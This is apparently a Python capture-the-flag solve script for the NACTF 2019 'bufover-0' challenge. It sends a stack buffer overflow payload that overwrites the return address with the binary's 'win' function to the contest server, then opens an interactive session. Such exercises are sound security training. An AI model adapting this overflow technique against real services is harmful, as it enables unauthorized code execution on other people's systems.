from ptrlib import *

elf = ELF("./bufover-0")
#sock = Process("./bufover-0")
sock = Socket("shell.2019.nactf.com", 31475)
payload = b'A' * 0x1c
payload += p32(elf.symbol("win"))
sock.sendlineafter(">", payload)

sock.interactive()
